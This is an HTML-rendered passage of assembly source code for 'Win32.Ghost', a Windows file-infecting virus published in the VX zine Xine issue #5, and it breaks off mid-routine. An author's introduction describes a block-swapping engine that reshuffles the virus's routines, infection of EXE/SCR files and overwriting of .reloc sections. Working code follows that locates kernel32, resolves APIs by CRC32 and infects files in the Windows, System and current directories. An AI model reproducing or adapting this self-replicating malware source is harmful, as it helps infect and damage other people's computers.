<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ghost.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">

</span><span class="sc1">;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                             ³ Xine - issue #5 - Phile 202 ³</span><span class="sc0">
</span><span class="sc1">;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">




</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄ¿</span><span class="sc0">
</span><span class="sc1">; ÚÄÜÜÜÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ        [ Win32.Ghost      Billy Belcebu/iKX ]</span><span class="sc0">
</span><span class="sc1">; ÀÄÛÛÛÄÛÛÛÛÛÛÄÄÄÛÛÛÛÛÄÄ¿ ÚÄÄÄÄÄÄ[ 1731 bytes    Target - Win32 Ring3 ]ÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; ÚÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ ³      [ 09/05/00 - Made in Valencia, Spain ]</span><span class="sc0">
</span><span class="sc1">; ÀÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Introduction ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Welcome to Ghost, the new  creation of Billy Belcebu (me!). Well, if you've</span><span class="sc0">
</span><span class="sc1">; read my 'Metamorphism Essay - Part II', i've just made a virus with a block</span><span class="sc0">
</span><span class="sc1">; swapping engine :) It's not  a new technique in  virus  coding, but i think</span><span class="sc0">
</span><span class="sc1">; it's the first time someone tries it in  Win32 viruses. Just a coding exer-</span><span class="sc0">
</span><span class="sc1">; cise, a previous step before  getting into the real metamorphism... step by</span><span class="sc0">
</span><span class="sc1">; step guys... i don't like  the pressure :) Well... this virus  is done very</span><span class="sc0">
</span><span class="sc1">; quickly, in much less time than all my other  viruses (except Win9x.Molly),</span><span class="sc0">
</span><span class="sc1">; because it taken  me 3 days to  make the whole thing... coding 1 or 2 hours</span><span class="sc0">
</span><span class="sc1">; per day. It isn't supposed to be the best virus on earth,but what the fuck,</span><span class="sc0">
</span><span class="sc1">; it's a virus, and it's written by me, so i am proud of it :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ How it works? ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Well, let's imagine that this is the virus in its first generation:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       A-BCDEFGHIJ-K ÄÄ virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The A and the K can't  be changed from  its place, because we need at least</span><span class="sc0">
</span><span class="sc1">; some routines  with a  fixed address (A) and  the  data  always in the same</span><span class="sc0">
</span><span class="sc1">; place (K).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; So if we pass the virus  through the BSE (Block Swapping Engine), we'll get</span><span class="sc0">
</span><span class="sc1">; all yhe routines with its  address changed. Let's see  it with  a graphical</span><span class="sc0">
</span><span class="sc1">; example:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       A-BCDEFGHIJ-K ÄÄ[ BSE ]ÄÄ A-GBCFJEIDH-K</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; For achieve  this goal  we have  an  structure with some references to each</span><span class="sc0">
</span><span class="sc1">; routine, called RIT (Routine Info Table), that  has an ID for each routine,</span><span class="sc0">
</span><span class="sc1">; and it's size. It's enough information for handle  all properly. Also, as i</span><span class="sc0">
</span><span class="sc1">; have  said  before we  have a BSE routine for process the RIT, and swap the</span><span class="sc0">
</span><span class="sc1">; routines randomly.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It's not metamorphism, but it's cool anyway :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Features ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + Block Swapping features included</span><span class="sc0">
</span><span class="sc1">;       + Some Win2k specific code (uses SFP)</span><span class="sc0">
</span><span class="sc1">;       + Infects EXE/SCR PE files</span><span class="sc0">
</span><span class="sc1">;       + Overwrites .reloc sections if present (renames .reloc to .ghost)</span><span class="sc0">
</span><span class="sc1">;       + Get's API addresses using only its CRC32</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; [ Why this name? ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Ok, the question present  in all viruses :) It's because  the last album of</span><span class="sc0">
</span><span class="sc1">; the  german  power metal  band Rage, called  Ghosts. It's the soundtrack of</span><span class="sc0">
</span><span class="sc1">; this virus. Specially i like the ballad 'Love and fear unite'... </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Greetings ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To all the iKX family, specially  to StarZer0 and  Asmodeus for  the  moral</span><span class="sc0">
</span><span class="sc1">; support they gave me  in my  worse moments, and for  pushing me  to keep on</span><span class="sc0">
</span><span class="sc1">; coding. Also to my friends  in the VX  scene, and also  my  friend  of real</span><span class="sc0">
</span><span class="sc1">; life RunAwayColt (Potro Desbocado), for being there and helping me.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 2000 Billy Belcebu/iKX               [ http://beautifulpeople.cjb.net ]</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Win32.Ghost                                  (c) 2000 Billy Belcebu/iKX |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

        </span><span class="sc2">.586p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">szTtl</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Win32.Ghost"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMsg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"First Generation Host"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(c) 2000 Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc0">
</span><span class="sc5">heap_size</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">heap_start</span><span class="sc0">
</span><span class="sc5">total_size</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc5">heap_size</span><span class="sc0">

</span><span class="sc5">PUSHAD_EDI</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESI</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBP</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESP</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBX</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EDX</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ECX</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EAX</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1Ch</span><span class="sc0">

</span><span class="sc5">MAX_PATH</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">104h</span><span class="sc0">

</span><span class="sc5">sign</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">InfectPE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">CheckImageBase</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">GetAPIs</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc5">GetAPI_ET_CRC32</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">05h</span><span class="sc0">
</span><span class="sc5">InfectDir</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">06h</span><span class="sc0">
</span><span class="sc5">ProcessExtension</span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">r_range</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">09h</span><span class="sc0">
</span><span class="sc5">bse</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0Ah</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Routine Info Table handling stuff                                       |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc5">rit</span><span class="sc0">     </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">r_id</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">r_size</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rit</span><span class="sc0">     </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">rit_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">      </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">rit</span><span class="sc0">

</span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">routine_id</span><span class="sc4">,</span><span class="sc5">routine_start</span><span class="sc4">,</span><span class="sc5">routine_end</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">routine_id</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routine_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">routine_start</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">routine_id</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">routine_id</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">call_rit</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">api2call</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">api2call</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | The virus code itself :P                                                |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;       int     3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kaka</span><span class="sc0">
</span><span class="sc5">kaka</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kaka</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">call_rit_routine</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">call_rit</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">05h</span><span class="sc0">                             </span><span class="sc1">; ECX is the limit of pages</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">                             </span><span class="sc1">; We put a page inside our code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">CheckImageBase</span><span class="sc0">                  </span><span class="sc1">; Get our own image base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">05h</span><span class="sc0">                             </span><span class="sc1">; 50 pages to scan</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">esp.24h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Put the candidate to kernel</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">CheckImageBase</span><span class="sc0">                  </span><span class="sc1">; Scan backwards for it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;       lea     eax,[ebp+api_list]              ; Let's detect all the needed</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; APIs :)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">api_addresses</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">GetAPIs</span><span class="sc0">

</span><span class="sc1">; Let's mix the blocks :)</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000</span><span class="sc0">                           </span><span class="sc1">; Alloc lotsa memory...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; Better too much than not</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc0">                     </span><span class="sc1">; enough :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; The memory is done like this table:</span><span class="sc0">
</span><span class="sc1">;       +-----------------------+</span><span class="sc0">
</span><span class="sc1">;       | Copy of RIT structure |</span><span class="sc0">
</span><span class="sc1">;       +-----------------------+</span><span class="sc0">
</span><span class="sc1">;       |   New RIT structure   |</span><span class="sc0">
</span><span class="sc1">;       +-----------------------+</span><span class="sc0">
</span><span class="sc1">;       |                       |</span><span class="sc0">
</span><span class="sc1">;       |    Swapped blocks     |</span><span class="sc0">
</span><span class="sc1">;       |                       |</span><span class="sc0">
</span><span class="sc1">;       +-----------------------+</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Make a copy of the original</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">routine_info_table</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; RIT in memory (for let BSE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">n_routines</span><span class="sc4">*</span><span class="sc5">rit_size</span><span class="sc0">             </span><span class="sc1">; to handle it)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_rit</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Save offset where we'll put</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">new_rit_mem</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; the new generated RIT</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">n_routines</span><span class="sc4">*</span><span class="sc5">rit_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">swapped_blocks</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Save offset where we'll</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">swapped_blocks_mem</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; put swapped blocks :)</span><span class="sc0">

        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">bse</span><span class="sc0">                             </span><span class="sc1">; Call our BSE</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Restore this interesting </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; info</span><span class="sc0">

</span><span class="sc1">; Infect some files in Windows, System and current directories</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current_dir</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Save current directory to</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; a temp variable</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infect_dir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">InfectDir</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infect_dir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">InfectDir</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current_dir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">InfectDir</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00400000h</span><span class="sc0">
</span><span class="sc5">ModBase</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_gen_host</span><span class="sc4">-</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">OldEIP</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.20h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
        
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Routine for call to swapped routines (dinamically)                      |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc1">; A bit weird, but w0rkz :)</span><span class="sc0">

</span><span class="sc5">call_rit_routine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">esp.24h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get routine_id :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.20h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Fix some stack things for</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.24h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; be able to return...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">n_routines</span><span class="sc0">                      </span><span class="sc1">; ECX = n of entries of RIT</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
